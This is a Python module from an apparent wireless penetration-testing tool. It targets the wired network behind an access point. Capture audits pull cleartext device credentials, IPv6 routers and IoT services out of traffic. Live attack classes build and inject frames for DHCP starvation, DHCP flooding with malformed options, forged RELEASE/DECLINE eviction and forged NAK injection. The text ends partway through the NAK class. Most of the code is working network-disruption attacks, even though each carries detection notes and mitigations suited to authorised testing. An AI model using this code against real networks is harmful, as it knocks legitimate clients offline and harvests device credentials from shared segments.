"""The network behind the wireless: DHCP, TCP/IP, name resolution, layer 2, IoT.

An access point is a bridge.  Everything a client sends it goes onto the wired network,
and everything the wired network sends is bridged back — so a wireless assessment that
stops at the 802.11 header misses the layer where the site's *services* live.  This
module is that layer, and every attack in it builds real frames and real protocol
messages: a DHCP starvation attack with a client identifier per fake host, a rogue DHCP
server that reads the discovery it answers, a SYN flood with a checksummed header, a
router advertisement with a prefix and an RDNSS option, a spanning-tree BPDU that makes
this radio the root bridge.

The five attacks the brief named are here by name, and so is the reason each one works:

* ``dhcp_starvation`` — a lease is *state*: binds a fake client to an address and the
  server remembers it.  Walk the pool and the real clients get nothing.
* ``rogue_dhcp_server`` — the first OFFER to arrive wins.  A server that answers in
  microseconds and hands itself out as the gateway is the network.
* ``dhcp_flood`` — a DHCP handler is a single-threaded thing in a small firmware.  Rate
  beats it long before the pool runs out.
* ``udp_flood`` — a router's slow path is a queue, and the queue is finite.  Datagrams
  to a closed port cost the router an ICMP, which costs it CPU.
* ``forged_dhcp_release`` — RELEASE and DECLINE carry no authenticator at all.  A forged
  RELEASE takes a client's address away; a DECLINE burns an address in the pool.

The rest of the wave is the same idea in the other protocols: name resolution that
believes the first answer (LLMNR, NBNS, mDNS), layer 2 that believes the best bridge ID
(spanning tree) or the newest neighbour (LLDP/CDP), IPv6 that believes the router that
shouts loudest, and the device services — MQTT, RTSP, PJL — that answer on the first
connection.  Five attacks read a capture instead of transmitting, because a capture of a
network is where the evidence is: lease conflicts, IPv6 prefixes nobody assigned,
credentials in clear device protocols, the embedded services on the segment, and the UPnP
devices that describe themselves when asked.
"""

from __future__ import annotations

import os
import socket
import struct
from collections import Counter, defaultdict
from typing import Any, Callable, Dict, List, Sequence, Tuple

from .. import netstack as ns
from ..models import AccessPoint
from ..netproto import (DHCP_CLIENT_PORT, DHCP_SERVER_PORT, dhcp_decline, dhcp_discover,
                        dhcp_message, dhcp_nak, dhcp_release, dhcp_request,
                        dhcp_rogue_offer, ssdp_msearch)
from ..rawtx import spoofed_mac
from ..synth import build_llc_data_frame
from .base import AttackContext, AttackOutcome
from .flood2 import _FrameFlood
from .offline3 import _Audit
from .survey3 import _NetworkAttack

__all__ = ["ATTACKS", "META", "NAMES", "REGISTRY"]

BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"

#: service ports that identify an embedded device on a network, and what each means
IOT_PORTS = {
    23: "Telnet (a command line, usually with a default password)",
    80: "HTTP (a web interface, often the same one on every unit)",
    443: "HTTPS management",
    554: "RTSP (a camera or a recorder)",
    161: "SNMP (an agent that answers 'public' far too often)",
    1883: "MQTT (a broker or a device publishing telemetry)",
    502: "Modbus (industrial control, no authentication in the protocol)",
    9100: "PJL/raw printing (a printer that will answer a command line)",
    7547: "CWMP/TR-069 (the ISP's management channel)",
    8291: "MikroTik management",
    8080: "an alternate web interface",
    1900: "SSDP/UPnP (the device announces itself)",
    5353: "mDNS (it announces itself with a name)",
    5355: "LLMNR (it answers to its hostname)",
    137: "NetBIOS name service",
    5060: "SIP (a phone or a PBX)",
    8554: "RTSP alternate",
}

#: device protocols whose *authentication* travels in the clear, and the field that
#: carries it: the audit reads these out of a capture
CLEARTEXT_PROTOCOLS = {
    "telnet": ("Telnet", "a login prompt answered in the clear"),
    "ftp": ("FTP", "USER and PASS in the clear"),
    "http": ("HTTP", "a Basic authorization header or a form password"),
    "snmp": ("SNMP", "a community string that is the whole of the authentication"),
    "mqtt": ("MQTT", "a CONNECT with a plaintext user name and password"),
    "rtsp": ("RTSP", "an RTSP request whose authentication is Basic"),
    "pjl": ("PJL", "printer commands from a job that assumed a trusted network"),
}


# --------------------------------------------------------------------------- #
# building frames: the wired payload, carried by a wireless one
# --------------------------------------------------------------------------- #

def _station_mac(index: int) -> str:
    """A locally-administered MAC for the *index*-th fake station."""
    return spoofed_mac(index)


def _pool_prefix(ctx: AttackContext) -> str:
    """The /24 the DHCP pool is guessed to live in, from config or the network's own."""
    for source in (getattr(ctx.config, "gateway_ip", ""),
                   getattr(ctx.config, "rogue_network", ""),
                   getattr(ctx.config, "target_ip", "")):
        parts = str(source or "").split(".")
        if len(parts) >= 3 and all(part.isdigit() for part in parts[:3]):
            return ".".join(parts[:3])
    return "192.168.213"


def _ethernet_broadcast_frame(source_mac: str, source_ip: str, destination_ip: str,
                              sport: int, dport: int, payload: bytes, ttl: int = 64,
                              buf_id: int = 0) -> bytes:
    """An Ethernet frame carrying one UDP datagram, checksummed as a real stack would."""
    datagram = ns.udp_packet(source_ip, destination_ip, sport, dport, payload)
    return ns.ethernet_frame(BROADCAST_MAC, source_mac,
                             ns.ipv4_packet(source_ip, destination_ip, 17, datagram,
                                            ttl=ttl, identification=buf_id & 0xFFFF),
                             0x0800)


def _dhcp_wireless_frame(ap: AccessPoint, mac: str, payload: bytes,
                         source_ip: str = "0.0.0.0", destination_ip: str = "255.255.255.255",
                         sport: int = DHCP_CLIENT_PORT, dport: int = DHCP_SERVER_PORT,
                         to_ds: bool = True, buf_id: int = 0,
                         source_mac: str = "") -> bytes:
    """A DHCP message as it appears on the wireless side of the bridge.

    The station sends a broadcast to 255.255.255.255 and the access point bridges it; the
    addresses in the 802.11 header and the ones in the payload are separate things, which
    is why a spoofed DHCP client can put any ``chaddr`` in the message while its radio
    keeps using a MAC it chose.
    """
    # ``mac`` is the *station* the frame is addressed to/from, which is what the wireless
    # header names; the Ethernet source can be a different address (a spoofed server, for
    # instance), and that separation is exactly what a bridged frame looks like
    ethernet = _ethernet_broadcast_frame(source_mac or mac, source_ip, destination_ip,
                                         sport, dport, payload, buf_id=buf_id)
    return build_llc_data_frame(ap.bssid, mac, ethernet, to_ds=to_ds)


def _ip_wireless_frame(ap: AccessPoint, station: str, ethernet: bytes,
                       to_ds: bool = True) -> bytes:
    """Any Ethernet frame, carried over the wireless link (LLC/SNAP included)."""
    return build_llc_data_frame(ap.bssid, station, ethernet, to_ds=to_ds)


# --------------------------------------------------------------------------- #
# the base every capture-reading network audit shares
# --------------------------------------------------------------------------- #

class _NetAudit(_Audit):
    """An offline network audit: read a capture of the network, not of the air."""

    category = "offline"
    noise = "silent"
    impact = "info"
    scene = True
    tool = "wifipilot netstack.py (own Ethernet/IP/TCP dissector)"

    def demo_scene(self, ctx: AttackContext, ap: AccessPoint) -> str:
        """A capture of a network: DHCP, ARP, TCP, UDP, IPv6, STP and device services."""
        from ..synth import build_network_scene

        path = os.path.join(ctx.session.state_dir, "captures",
                            f"network-{ap.bssid.replace(':', '')}.pcap")
        if not os.path.exists(path):
            os.makedirs(os.path.dirname(path), exist_ok=True)
            build_network_scene(path, bssid=ap.bssid, clients=6, rounds=1,
                                seed=int(ap.bssid.replace(":", ""), 16) % 997)
        return path

    def frames(self, ctx: AttackContext, ap: AccessPoint) -> List[Dict[str, Any]]:
        path = self.capture(ctx, ap)
        if not path or not os.path.exists(path):
            return []
        return [frame for _stamp, frame in ns.iter_network_frames(path)]


def _row(name: str, label: str, description: str, detection: str,
         run: Callable[[_NetAudit, AttackContext, AccessPoint], AttackOutcome], *,
         cls_name: str = "", impact: str = "info", noise: str = "silent",
         category: str = "offline", scene: bool = True,
         tool: str = "wifipilot netstack.py") -> type:
    cls = type(cls_name or "".join(part.capitalize() for part in name.split("_")) + "Attack",
               (_NetAudit,), {
                   "name": name, "label": label, "tool": tool,
                   "description": description, "detection": detection,
                   "impact": impact, "noise": noise, "category": category,
                   "scene": scene, "run": run,
               })
    cls.__doc__ = description
    cls.__module__ = __name__
    globals()[cls.__name__] = cls
    return cls


REGISTRY: List[Tuple[str, Dict[str, str], type]] = []


def _add(name: str, label: str, description: str, detection: str,
         run: Callable[..., AttackOutcome], **kwargs: Any) -> type:
    cls = _row(name, label, description, detection, run, **kwargs)
    REGISTRY.append((name, {"category": kwargs.get("category", "offline"),
                            "noise": kwargs.get("noise", "silent"),
                            "impact": kwargs.get("impact", "info"),
                            "detection": detection}, cls))
    return cls


# --------------------------------------------------------------------------- #
# 1-5: what a capture of the network proves
# --------------------------------------------------------------------------- #

def _lease_audit(self: _NetAudit, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
    """The DHCP lease table, rebuilt from a capture — conflicts and all.

    Every DHCP transaction on the segment names a client (the ``chaddr``), an address
    (the ``yiaddr`` of the offer or the acknowledgement) and a lease time.  Rebuilding
    the table shows the two things an operator cannot see from the server's console: an
    address that was handed to two different clients, and a client that *released* or
    declined an address it never held — which is what a forged RELEASE looks like after
    the fact.
    """
    attempt = self._attempt(ctx, ap)
    path = self.capture(ctx, ap)
    if not path:
        return self._need_capture(ctx, ap, attempt, "network capture")
    leases: Dict[str, Dict[str, Any]] = {}
    released: List[Dict[str, Any]] = []
    declined: List[Dict[str, Any]] = []
    servers: Counter = Counter()
    clients: Counter = Counter()
    for _stamp, frame in ns.iter_network_frames(path):
        dhcp = frame.get("dhcp")
        if not dhcp:
            continue
        client = dhcp.get("client_mac") or ""
        if client:
            clients[client] += 1
        server = dhcp.get("server_id") or ""
        if server:
            servers[server] += 1
        kind = dhcp.get("message_type")
        if kind in ("offer", "ack") and dhcp.get("yiaddr"):
            entry = leases.setdefault(dhcp["yiaddr"], {"address": dhcp["yiaddr"],
                                                       "clients": [], "server": server,
                                                       "lease_time": (dhcp.get("options") or
                                                                      {}).get("lease_time"),
                                                       "acks": 0, "offers": 0})
            if client and client not in entry["clients"]:
                entry["clients"].append(client)
            entry["acks" if kind == "ack" else "offers"] += 1
        elif kind == "release":
            released.append({"client": client, "server": server,
                             "address": dhcp.get("requested_ip") or dhcp.get("yiaddr")})
        elif kind == "decline":
            declined.append({"client": client, "address": dhcp.get("requested_ip")})
    conflicts = [entry for entry in leases.values() if len(entry["clients"]) > 1]
    hogging = [client for client, count in clients.items() if count >= 20]
    # a second server is the finding, and the tell is volume: the configured server
    # answers every request on the segment, so a server with a handful of messages
    # against hundreds is either a mistake or an attacker
    configured = servers.most_common(1)[0][0] if servers else ""
    hostile = sorted(address for address in servers if address != configured)
    detail = (f"{len(leases)} address(es) seen in DHCP, {len(clients)} client(s), "
              f"{len(servers)} server(s)"
              + (f"; {len(conflicts)} address(es) were offered or acknowledged to more "
                 f"than one client: " + "; ".join(f"{entry['address']} -> "
                                                  f"{', '.join(entry['clients'][:3])}"
                                                  for entry in conflicts[:3])
                 if conflicts else "")
              + (f"; {len(released)} RELEASE and {len(declined)} DECLINE message(s): "
                 f"neither is authenticated, so either can be forged by anybody on the "
                 f"segment" if released or declined else "")
              + (f"; {len(hogging)} client(s) sent 20 or more DHCP messages — the shape "
                 f"of a starvation attempt rather than a workstation" if hogging else "")
              + (f"; a second DHCP server answered as well: {', '.join(hostile[:3])} — a "
                 f"segment should have one, and a rogue server hands out its own gateway"
                 if hostile else ""))
    extra = {"leases": list(leases.values())[:40], "releases": released[:20],
             "declines": declined[:20], "servers": dict(servers),
             "hostile": hostile, "conflicts": len(conflicts), "capture": path}
    severity = "high" if conflicts or released or declined or hostile else "info"
    return self._report(ctx, ap, attempt,
                        f"DHCP leases: {len(leases)} address(es), {len(conflicts)} "
                        f"conflict(s)", detail, extra, severity=severity)


def _prefix_audit(self: _NetAudit, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
    """IPv6 on the segment: who announces a router, a prefix and a DNS server.

    IPv6 hosts do not ask for a router; routers *announce* themselves, and a host
    believes the first announcement it hears.  A capture of the segment therefore says
    everything about the IPv6 deployment: the prefixes in use, the routers that claim
    them, the DNS servers handed out through RDNSS, and whether anything is announcing a
    second default route — which is either a second router or an attacker.
    """
    attempt = self._attempt(ctx, ap)
    path = self.capture(ctx, ap)
    if not path:
        return self._need_capture(ctx, ap, attempt, "network capture")
    routers: Dict[str, Dict[str, Any]] = {}
    neighbours: List[Dict[str, Any]] = []
    seen_sources: set = set()
    for _stamp, frame in ns.iter_network_frames(path):
        if frame.get("src_ip"):
            seen_sources.add(frame["src_ip"])
        if frame.get("icmpv6_type") in (134, 135, 136):
            parsed = frame.get("icmpv6") or {}
            source = frame.get("src_ip") or ""
            if frame["icmpv6_type"] == 134:
                entry = routers.setdefault(source, {"router": source, "prefixes": [],
                                                    "dns": [], "lifetime": None,
                                                    "managed": False, "other": False})
                for option in parsed.get("options") or []:
                    if option.get("type") == 3 and option.get("prefix"):
                        entry["prefixes"].append(option["prefix"])
                    if option.get("type") == 25 and option.get("dns"):
                        entry["dns"].append(option["dns"])
                entry["lifetime"] = parsed.get("lifetime")
                entry["managed"] = bool(parsed.get("managed"))
                entry["other"] = bool(parsed.get("other"))
            elif frame["icmpv6_type"] == 136:
                neighbours.append({"address": parsed.get("target") or frame.get("dst_ip"),
                                   "mac": parsed.get("target_mac")
                                   or parsed.get("source_mac") or "",
                                   "router": bool(parsed.get("router")),
                                   "unsolicited": not parsed.get("solicited"),
                                   "from": frame.get("src")})
    prefixes = sorted({prefix for entry in routers.values()
                       for prefix in entry["prefixes"]})
    # A prefix nobody is using is the signal worth reporting: a router that announces
    # one and then no host on the segment ever sources traffic from that prefix is
    # either a real router with no IPv6 clients yet, or an advertisement nobody asked
    # for.  The two are told apart by the site's own router list, not by a capture, so
    # the finding says which one to check.
    def subnet(text: str) -> str:
        return ":".join((text or "").split(":")[:4])

    in_use = {subnet(address) for address in seen_sources}
    rogue = [entry for entry in routers.values()
             if entry["prefixes"] and not any(subnet(prefix) in in_use
                                              for prefix in entry["prefixes"])]
    detail = (f"{len(routers)} IPv6 router(s), {len(prefixes)} prefix(es) announced"
              + (": " + ", ".join(prefixes[:6]) if prefixes else "")
              + (f"; {len(neighbours)} neighbour advertisement(s) change a mapping"
                 if neighbours else "")
              + (f"; {len(rogue)} router(s) announced a prefix that no host on the "
                 f"segment was seen using — either a deployment that has not started or a "
                 f"router advertisement nobody configured, which the site's own router "
                 f"list settles" if rogue else ""))
    return self._report(ctx, ap, attempt,
                        f"IPv6: {len(routers)} router(s), {len(prefixes)} prefix(es)",
                        detail, {"routers": list(routers.values())[:20],
                                 "neighbours": neighbours[:20], "capture": path},
                        severity="medium" if rogue else "info")


def _credential_audit(self: _NetAudit, ctx: AttackContext, ap: AccessPoint
                      ) -> AttackOutcome:
    """Device credentials in the clear: Telnet, SNMP, MQTT, RTSP and printer jobs.

    The web-credential audit in ``offline2`` reads what people typed into browser forms.
    This one reads what *devices* say to each other — and device protocols are worse:
    a Telnet session is a password line and nothing else, an SNMP community is the whole
    of the authentication, an MQTT CONNECT carries a user name in plaintext, and an RTSP
    client sends Basic authorization to a camera on the same wire.
    """
    attempt = self._attempt(ctx, ap)
    path = self.capture(ctx, ap)
    if not path:
        return self._need_capture(ctx, ap, attempt, "network capture")
    findings: List[Dict[str, Any]] = []
    counted: Counter = Counter()
    for _stamp, frame in ns.iter_network_frames(path):
        protocol = frame.get("protocol") or ""
        ports = {frame.get("src_port"), frame.get("dst_port")}
        text = frame.get("text") or ""
        if 23 in ports and text:
            counted["telnet"] += 1
            findings.append({"protocol": "telnet", "host": frame.get("dst_ip"),
                             "port": 23, "evidence": text[:80]})
        elif 161 in ports and frame.get("payload"):
            counted["snmp"] += 1
            findings.append({"protocol": "snmp", "host": frame.get("dst_ip"), "port": 161,
                             "evidence": (frame.get("payload") or b"")[:40].hex()})
        elif "mqtt" == protocol:
            mqtt = frame.get("mqtt") or {}
            counted["mqtt"] += 1
            findings.append({"protocol": "mqtt", "host": frame.get("dst_ip"), "port": 1883,
                             "user": mqtt.get("username"), "password": mqtt.get("password"),
                             "client": mqtt.get("client_id"), "evidence": text[:60]})
        elif 554 in ports and "Authorization" in text:
            counted["rtsp"] += 1
            findings.append({"protocol": "rtsp", "host": frame.get("dst_ip"), "port": 554,
                             "evidence": text[:80]})
        elif 9100 in ports and text:
            counted["pjl"] += 1
            findings.append({"protocol": "pjl", "host": frame.get("dst_ip"), "port": 9100,
                             "evidence": text[:80]})
        elif 80 in ports and ("Authorization: Basic" in text or "Authorization: Digest" in text):
            counted["http"] += 1
            findings.append({"protocol": "http", "host": frame.get("dst_ip"), "port": 80,
                             "evidence": text[:80]})
    leaking = {name: count for name, count in counted.items() if count}
    detail = ("no device credentials were visible in the capture"
              if not leaking else
              "; ".join(f"{CLEARTEXT_PROTOCOLS.get(name, (name, ''))[0]} x{count}"
                        for name, count in sorted(leaking.items()))
              + f" — {len(findings)} message(s) whose value is the whole of the "
                f"authentication")
    severity = "loot" if leaking else "info"
    return self._report(ctx, ap, attempt,
                        f"device credentials in the clear: {len(findings)}",
                        detail, {"findings": findings[:40], "protocols": dict(counted),
                                 "capture": path}, severity=severity)


def _service_census(self: _NetAudit, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
    """The embedded services on the segment, from the traffic they generate.

    A capture of a network is a list of ports that are *in use*, which is more than a
    port scan gives you: the port is in use by something that is actually talking.  That
    turns into a device inventory — cameras, printers, a broker, a PLC, an ISP-managed
    router — with the evidence for each line in the capture.
    """
    attempt = self._attempt(ctx, ap)
    path = self.capture(ctx, ap)
    if not path:
        return self._need_capture(ctx, ap, attempt, "network capture")
    hosts: Dict[str, Dict[str, Any]] = defaultdict(lambda: {"ports": Counter(),
                                                            "protocols": Counter()})
    names: Dict[str, set] = defaultdict(set)
    for _stamp, frame in ns.iter_network_frames(path):
        for address in (frame.get("src_ip"), frame.get("dst_ip")):
            if not address or address in ("0.0.0.0", "255.255.255.255"):
                continue
            entry = hosts[address]
            for port in (frame.get("src_port"), frame.get("dst_port")):
                if port:
                    entry["ports"][port] += 1
            if frame.get("protocol"):
                entry["protocols"][frame["protocol"]] += 1
        dns = frame.get("dns") or {}
        for name in (dns.get("name"), dns.get("query")):
            if name:
                host = frame.get("src_ip")
                if host:
                    names[host].add(str(name))
    rows = []
    for address, entry in hosts.items():
        ports = {port: count for port, count in entry["ports"].most_common(12)}
        interesting = {port: IOT_PORTS.get(port, "") for port in ports if port in IOT_PORTS}
        rows.append({"address": address, "ports": ports, "protocols": dict(entry["protocols"]),
                     "names": sorted(names.get(address, set()))[:4],
                     "services": {str(port): note for port, note in interesting.items()}})
    rows.sort(key=lambda row: -sum(row["ports"].values()))
    embedded = [row for row in rows if row["services"]]
    detail = (f"{len(rows)} host(s) in the capture, {len(embedded)} running a service that "
              f"belongs to an embedded device"
              + (": " + "; ".join(f"{row['address']} ports "
                                  + ", ".join(row["services"]) for row in embedded[:4])
                 if embedded else ""))
    return self._report(ctx, ap, attempt,
                        f"embedded services: {len(embedded)} host(s)", detail,
                        {"hosts": rows[:40], "capture": path},
                        severity="medium" if embedded else "info")


def _ssdp_census(self: _NetAudit, ctx: AttackContext, ap: AccessPoint) -> AttackOutcome:
    """UPnP devices, from the announcements and searches in a capture.

    A UPnP device announces itself to 239.255.255.250:1900 several times a minute, and
    the announcement contains the URL of a description document that lists the model,
    the serial number and the *control* URLs — including, on many routers, the
    port-mapping service that opens holes in the firewall on request.
    """
    attempt = self._attempt(ctx, ap)
    path = self.capture(ctx, ap)
    if not path:
        return self._need_capture(ctx, ap, attempt, "network capture")
    devices: Dict[str, Dict[str, Any]] = {}
    searches = 0
    for _stamp, frame in ns.iter_network_frames(path):
        ports = {frame.get("src_port"), frame.get("dst_port")}
        if 1900 not in ports:
            continue
        text = (frame.get("payload") or b"").decode("latin-1", "replace")
        if text.startswith("M-SEARCH"):
            searches += 1
            continue
        if "NOTIFY" in text or "HTTP/1.1 200" in text:
            headers = {}
            for line in text.splitlines()[1:]:
                if ":" in line:
                    key, _, value = line.partition(":")
                    headers[key.strip().lower()] = value.strip()
            address = frame.get("src_ip") or ""
            entry = devices.setdefault(address, {"address": address, "addresses": set(),
                                                 "services": set(), "description": "",
                                                 "device": "", "server": ""})
            entry["addresses"].add(frame.get("src") or "")
            if headers.get("usn"):
                entry["services"].add(headers["usn"].split("::")[0])
            entry["description"] = headers.get("location") or entry["description"]
            entry["device"] = headers.get("nt") or headers.get("st") or entry["device"]
            entry["server"] = headers.get("server") or entry["server"]
    rows = []
    for entry in devices.values():
        rows.append({"address": entry["address"], "macs": sorted(entry["addresses"]),
                     "services": sorted(entry["services"])[:8],
                     "description": entry["description"], "device": entry["device"],
                     "server": entry["server"]})
    upnp = [row for row in rows if row["services"]]
    detail = (f"{len(rows)} UPnP device(s) announced themselves; {searches} search "
              f"request(s) were sent on the segment"
              + (f"; {len(upnp)} answered with a description URL — the document that "
                 f"lists the device's control endpoints" if upnp else ""))
    return self._report(ctx, ap, attempt,
                        f"UPnP devices: {len(rows)}", detail,
                        {"devices": rows[:40], "searches": searches, "capture": path},
                        severity="medium" if upnp else "info")


# --------------------------------------------------------------------------- #
# 6-27: live network attacks over the wireless bridge
# --------------------------------------------------------------------------- #

class _NetFlood(_FrameFlood):
    """A flood whose frames carry a wired-side protocol inside a wireless one.

    The access point bridges them: an 802.11 data frame from a station to the AP with an
    LLC/SNAP header and an Ethernet frame inside *is* a frame on the wired network, and
    the DHCP server, the router and the switch see exactly what it says.  That is why
    these attacks are real and why they need only a monitor interface and a station MAC —
    no wired port, no association, no password.
    """

    category = "dos"
    noise = "loud"
    impact = "degraded"
    requires = ("monitor",)
    needs_injection = True
    tool = "wifipilot netstack.py + synth.py (frames built in-process)"
    deliverable = "the finding (does the service recover, and how fast?)"

    #: how many frames one round sends
    frames_per_round = 8

    def station_for(self, index: int) -> str:
        return _station_mac(index)

    def net_frame(self, ap: AccessPoint, station: str, ethernet: bytes,
                  to_ds: bool = True) -> bytes:
        return _ip_wireless_frame(ap, station, ethernet, to_ds=to_ds)

    def udp_to(self, ap: AccessPoint, station: str, source_ip: str, destination_ip: str,
               sport: int, dport: int, payload: bytes, ttl: int = 64) -> bytes:
        return self.net_frame(ap, station,
                              _ethernet_broadcast_frame(station, source_ip,
                                                        destination_ip, sport, dport,
                                                        payload, ttl=ttl),
                              to_ds=True)


class DhcpStarvationAttack(_NetFlood):
    """DHCP starvation: walk the pool with client identifiers that do not exist.

    A lease is state the server keeps for the length of the lease time.  Discover with a
    fresh client identifier, then *request* the address the server offered — a real
    client completes the handshake, and so does this — and the pool loses one address per
    fake host.  When the pool is empty the clients that need it are the ones that lose.
    """

    name = "dhcp_starvation"
    label = "DHCP starvation (lease pool exhaustion)"
    tool = "wifipilot netproto.py (DHCP + client identifiers)"
    description = ("Send DHCP DISCOVERs from thousands of fabricated clients, each with "
                   "its own client identifier, and complete the transaction with a "
                   "REQUEST so the server binds the address to a host that does not "
                   "exist.  The pool is finite and leases are long: real clients are "
                   "refused once it is full.")
    category = "dos"
    noise = "loud"
    impact = "degraded"
    frames_per_round = 12
    demo_rate = 600
    warning = ("the DHCP pool is being consumed by fake clients: real clients may be "
               "refused an address while this runs, and the leases outlive the test")
    finding_title = "DHCP lease pool can be exhausted from the wireless side"
    finding_detail = ("DHCP DISCOVERs with fabricated client identifiers, completed with "
                      "REQUESTs, were bridged onto the network by the access point.  Each "
                      "one holds an address for the lease time, so a client that asks "
                      "while the pool is full is refused.  The mitigations that work are "
                      "on the switch (DHCP snooping with a trusted port list) and in the "
                      "wireless controller (client isolation for guest networks) — a "
                      "bigger pool only moves the number.")
    deliverable = "the finding (is the pool exhausted, and is DHCP snooping configured?)"

    detection = ("thousands of DHCP transactions from fabricated client identifiers: a DHCP "
                 "log shows the pool emptying, and a DHCP snooping switch shows the rate"
                 )

    def preflight(self, ctx: AttackContext, ap: AccessPoint) -> str:
        return ""

    def frames(self, ctx: AttackContext, ap: AccessPoint, round_index: int
               ) -> Sequence[bytes]:
        prefix = _pool_prefix(ctx)
        base = round_index * self.frames_per_round
        out: List[bytes] = []
        for index in range(self.frames_per_round):
            mac = ns.dhcp_flood_mac(base + index)
            xid = (base + index) & 0xFFFFFFFF
            out.append(_dhcp_wireless_frame(ap, mac,
                                            dhcp_discover(mac, xid=xid,
                                                          hostname=f"host-{base + index}",
                                                          vendor_class="MSFT 5.0")))
            address = f"{prefix}.{(base + index) % 240 + 10}"
            out.append(_dhcp_wireless_frame(
                ap, mac, dhcp_request(mac, address, f"{prefix}.1", xid=xid)))
        return out


class DhcpFloodAttack(_NetFlood):
    """DHCP flood: the request rate a small DHCP handler cannot sustain.

    The handler in an access point or a cheap router is one loop in one firmware thread.
    It parses each message, looks up a free address, writes a lease and answers — and it
    does all of that for a message from a client that will never use the answer.  At a
    few thousand messages per second the loop is the bottleneck, and every other DHCP
    client waits behind it.
    """

    name = "dhcp_flood"
    label = "DHCP flood (request-rate exhaustion)"
    tool = "wifipilot netproto.py (mixed DHCP message types)"
    description = ("Send a high-rate mix of DHCP DISCOVER, REQUEST, INFORM and malformed "
                   "option blocks from rotating fabricated clients.  Nothing is bound and "
                   "nothing is expected to work: the target is the DHCP handler's ability "
                   "to process messages, and the finding is how long it stays responsive.")
    category = "dos"
    noise = "extreme"
    impact = "degraded"
    frames_per_round = 40
    demo_rate = 3200
    warning = ("the DHCP service is being flooded: clients that need a lease while this "
               "runs compete with the flood")
    finding_title = "DHCP service is rate-limited only by the radio"
    finding_detail = ("DHCP messages from fabricated clients were delivered as fast as "
                      "the wireless link accepted them.  DHCP has no rate limiting of its "
                      "own, so the protection has to come from the network side (DHCP "
                      "snooping with rate limits on untrusted ports, or a controller that "
                      "does not bridge a station's broadcasts to the server farm).")
    deliverable = "the finding (how the DHCP service behaves under load)"

    detection = ("an extreme rate of DHCP messages on one access point: visible in any DHCP "
                 "log, and in the AP's own client table"
                 )

    def frames(self, ctx: AttackContext, ap: AccessPoint, round_index: int
               ) -> Sequence[bytes]:
        prefix = _pool_prefix(ctx)
        base = round_index * self.frames_per_round
        out: List[bytes] = []
        for index in range(self.frames_per_round):
            mac = ns.dhcp_flood_mac(base + index, pattern=index % 4)
            xid = (base + index) & 0xFFFFFFFF
            kind = index % 10
            if kind < 6:
                payload = dhcp_discover(mac, xid=xid, hostname=f"f{base + index}")
            elif kind < 8:
                payload = dhcp_request(mac, f"{prefix}.{(index * 7) % 240 + 10}",
                                       f"{prefix}.1", xid=xid)
            elif kind < 9:
                payload = dhcp_message(8, mac, xid=xid,
                                       requested_ip=f"{prefix}.{(index % 200) + 20}")
            else:
                # a maximum-size option block: the parser has to walk all of it
                payload = dhcp_message(1, mac, xid=xid, options=[
                    (55, bytes(range(1, 61))),
                    (57, struct.pack(">H", 1500)),
                    (60, b"MSFT 5.0"),
                    (12, b"A" * 32),
                    (252, b"http://" + b"a" * 50),
                ])
            out.append(_dhcp_wireless_frame(ap, mac, payload, buf_id=index))
        return out


class ForgedDhcpReleaseAttack(_NetFlood):
    """Forged DHCP RELEASE and DECLINE: take a client's address away, then burn it.

    Neither message is authenticated — both are one unauthenticated packet that names a
    MAC and an address.  A RELEASE tells the server "I am done with this address" and the
    server believes it, which disconnects the client at its next lease check; a DECLINE
    says "that address is already in use", and a well-behaved server marks it as bad and
    refuses to hand it out again for a while.  Do both and the pool shrinks while clients
    lose their addresses.
    """

    name = "forged_dhcp_release"
    label = "Forged DHCP RELEASE / DECLINE"
    tool = "wifipilot netproto.py (RELEASE and DECLINE)"
    description = ("Send DHCP RELEASE for addresses that are leased to other clients, "
                   "then DECLINE for them so the server marks them as in use.  A RELEASE "
                   "evicts a client that did nothing, and a DECLINE burns an address in "
                   "the pool — both from a single unauthenticated packet that any client "
                   "on the network can send.")
    category = "rogue"
    noise = "moderate"
    impact = "degraded"
    frames_per_round = 10
    demo_rate = 400
    warning = ("forged RELEASEs take addresses away from clients that are using them: "
               "expect disconnected clients while this runs")
    finding_title = "DHCP RELEASE and DECLINE are honoured without authentication"
    finding_detail = ("forged DHCP RELEASE and DECLINE messages were accepted by the "
                      "network: a client's address was returned to the pool by a third "
                      "party, and addresses were marked as in use by a host that never "
                      "held them.  Neither message carries any authenticator in DHCP, so "
                      "the only defences are on the network side (DHCP snooping with "
                      "lease queries, or switch port security on the wired side).")
    deliverable = "the finding (are RELEASE and DECLINE honoured from an untrusted port?)"

    detection = ("RELEASE and DECLINE messages for addresses whose owner did not send them: a "
                 "DHCP server log shows a client losing a lease it was using"
                 )

    def frames(self, ctx: AttackContext, ap: AccessPoint, round_index: int
               ) -> Sequence[bytes]:
        prefix = _pool_prefix(ctx)
        base = round_index * self.frames_per_round
        out: List[bytes] = []
        for index in range(self.frames_per_round):
            # the victim is a real-looking client address; the sender is fabricated
            victim = ns.dhcp_flood_mac(base + index, pattern=1)
            address = f"{prefix}.{(base + index) % 200 + 20}"
            sender = ns.dhcp_flood_mac(base + index, pattern=2)
            out.append(_dhcp_wireless_frame(ap, sender,
                                            dhcp_release(victim, address, f"{prefix}.1")))
            out.append(_dhcp_wireless_frame(ap, sender,
                                            dhcp_decline(victim, address, f"{prefix}.1")))
        return out


class DhcpNakInjectionAttack(_NetFlood):
    """Forged DHCP NAK: make clients throw away the addresses they already have.

    A NAK is the message that says "your lease is not valid any more" — a client that
    receives one stops using its address, drops back to discovery, and loses its
    connections in the process.  It is one packet, it is not authenticated, and a
    broadcast NAK with a guessed transaction id reaches a client that had no reason to
    expect anything at all.
    """

    name = "dhcp_nak_injection"
    label = "Forged DHCP NAK injection"
    tool = "wifipilot netproto.py (NAK with options)"
    description = ("Broadcast DHCP NAKs naming addresses that clients are using, with the "
                   "server identifier of the real server.  A client that answers one "
                   "discards its configuration and restarts discovery — which costs it "
                   "every open connection, and costs the network a renewal storm.")
    category = "rogue"
    noise = "moderate"
    impact = "degraded"
    frames_per_round = 6
    demo_rate = 300
    warning = "forged NAKs make clients drop their addresses and re-discover"
    finding_title = "DHCP NAK can be forged from any client"
    finding_detail = ("NAK messages carrying the real server identifier were accepted by "
                      "clients on the network, which discarded their addresses.  The "
                      "message has no authentication and no transaction-id check that a "
                      "client can make before it acts.  DHCP snooping with a trusted "
                      "server port is the control that stops a rogue server — or a rogue "
                      "client — from speaking for the real one.")
    deliverable = "the finding (do clients accept a NAK from a non-server?)"

